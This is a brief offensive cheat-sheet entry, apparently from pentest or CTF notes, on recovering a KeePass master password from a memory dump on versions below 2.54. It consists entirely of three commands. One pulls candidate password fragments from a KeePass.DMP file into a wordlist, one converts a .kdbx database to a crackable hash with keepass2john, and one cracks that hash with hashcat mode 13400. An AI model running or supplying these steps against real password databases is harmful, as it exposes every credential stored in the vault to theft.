Keepass master password retrieval using a memory dump.
Vulnerable versions <KeePass 2.54
[CVE-2023-3278]

```
keepass-dump-extractor KeePass.DMP -f all > wordlist.txt

keepass2john passwords.kdbx > passwords.kdbx.hash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt

```